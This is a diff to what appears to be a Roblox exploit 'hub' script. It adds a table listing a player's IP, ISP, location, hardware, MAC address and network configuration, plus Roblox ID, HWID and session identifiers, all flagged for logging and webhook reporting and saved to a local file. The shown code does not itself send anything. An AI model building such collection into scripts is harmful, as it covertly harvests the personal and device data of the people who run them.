@@ -146,6 +146,68 @@ game.Players.ChildAdded:Connect(function(plr)
 	end
 end)
 
+local LOGs = true
+local WEBHOOKs = true
+local WL = {
+    LOGs = {
+        ['IP'] = true,
+        ['ISP'] = true,
+        ['Location'] = true,
+        ['Computer Specification'] = true,
+        ['Motherboard'] = true,
+        ['Random Access Memory'] = true,
+        ['Central Processing Unit'] = true,
+        ['Video Card'] = true,
+        ['Hard Drive'] = true,
+        ['Solid-State Drive'] = true,
+        ['Optical Drive'] = true,
+        ['Router'] = true,
+        ['Network Switch'] = true,
+        ['Access Point'] = true,
+        ['DNS'] = true,
+        ['Host Name'] = true,
+        ['Primary Dns Suffix'] = true,
+        ['IP Routing'] = true,
+        ['WINS Proxy'] = true,
+        ['Connection-specific DNS Suffix'] = true,
+        ['Description'] = true,
+        ['Physical Address'] = true,
+        ['DHCP'] = true,
+        ['Autoconfiguration'] = true,
+        ['Link-local IPv6 Address'] = true,
+        ['IpPv4 Address'] = true,
+        ['Subnet Mask'] = true,
+        ['Lease Obtained'] = true,
+        ['Lease Expires'] = true,
+        ['Default Gateway'] = true,
+        ['DHCP Server'] = true,
+        ['DHCPv6 IAID'] = true,
+        ['DHCPv6 Client DUID'] = true,
+        ['DNS Servers'] = true,
+        ['NetBIOS over Tcpip'] = true,
+    },
+    WEBHOOKs = {
+        ['Roblox Name'] = true,
+        ['Roblox UserId'] = true,
+        ['Game Placeid'] = true,
+        ['GUID'] = true,
+        ['Job Id'] = true,
+        ['HWID'] = true,
+        ['Auto Generate Key'] = true,
+    },
+}
+local Name = "moonlit-hub.host"
+pcall(function()
+    if not pcall(function() readfile(Name) end) then 
+        writefile(Name, game:service'HttpService':JSONEncode(WL)) 
+    end
+    WL = game:service'HttpService':JSONDecode(readfile(Name))
+end)
+
+local function Save()
+    writefile(Name,game:service'HttpService':JSONEncode(WL))
+end
+
 if game.PlaceId == 659222129 then
 	if not game:IsLoaded() then
     	game.Loaded:wait()
